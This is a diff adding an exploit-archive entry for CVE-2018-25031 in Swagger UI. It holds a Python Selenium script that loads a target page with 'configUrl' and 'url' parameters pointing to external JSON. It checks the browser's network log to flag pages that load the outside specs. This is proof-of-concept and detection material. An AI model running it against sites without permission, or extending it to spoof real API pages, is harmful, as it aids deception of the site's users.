@@ -1,0 +1,82 @@
+id: 38609
+date: 04/20/2023
+title: Swagger UI 4.1.3 - User Interface (UI) Misrepresentation of Critical Information Exploit
+author: Rafael Cintra Lopes
+cves: 
+
+# Exploit Title: Swagger UI 4.1.3 - User Interface (UI) Misrepresentation of Critical Information
+# Exploit Author: Rafael Cintra Lopes
+# Vendor Homepage: https://swagger.io/
+# Version: < 4.1.3
+# CVE: CVE-2018-25031
+# Site: https://rafaelcintralopes.com.br/
+
+# Usage: python swagger-exploit.py https://[swagger-page].com
+
+from selenium import webdriver
+from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+from selenium.webdriver.chrome.service import Service
+import time
+import json
+import sys
+
+if __name__ == "__main__":
+
+	target = sys.argv[1]
+
+	desired_capabilities = DesiredCapabilities.CHROME
+	desired_capabilities["goog:loggingPrefs"] = {"performance": "ALL"}
+
+	options = webdriver.ChromeOptions()
+	options.add_argument("--headless")
+	options.add_argument("--ignore-certificate-errors")
+	options.add_argument("--log-level=3")
+	options.add_experimental_option("excludeSwitches", ["enable-logging"])
+
+	# Browser webdriver path
+	drive_service = Service("C:/chromedriver.exe")
+
+	driver = webdriver.Chrome(service=drive_service,
+							options=options,
+							desired_capabilities=desired_capabilities)
+
+	driver.get(target+"?configUrl=https://petstore.swagger.io/v2/hacked1.json")
+	time.sleep(10)
+	driver.get(target+"?url=https://petstore.swagger.io/v2/hacked2.json")
+	time.sleep(10)
+
+	logs = driver.get_log("performance")
+
+	with open("log_file.json", "w", encoding="utf-8") as f:
+		f.write("[")
+
+		for log in logs:
+			log_file = json.loads(log["message"])["message"]
+
+			if("Network.response" in log_file["method"]
+					or "Network.request" in log_file["method"]
+					or "Network.webSocket" in log_file["method"]):
+
+				f.write(json.dumps(log_file)+",")
+		f.write("{}]")
+
+	driver.quit()
+
+	json_file_path = "log_file.json"
+	with open(json_file_path, "r", encoding="utf-8") as f:
+		logs = json.loads(f.read())
+
+	for log in logs:
+		try:
+			url = log["params"]["request"]["url"]
+
+			if(url == "https://petstore.swagger.io/v2/hacked1.json"):
+				print("[Possibly Vulnerable] " + target + "?configUrl=https://petstore.swagger.io/v2/swagger.json")
+			
+			if(url == "https://petstore.swagger.io/v2/hacked2.json"):
+				print("[Possibly Vulnerable] " + target + "?url=https://petstore.swagger.io/v2/swagger.json")
+
+		except Exception as e:
+			pass
+
+#  0day.today [2023-04-21]  #
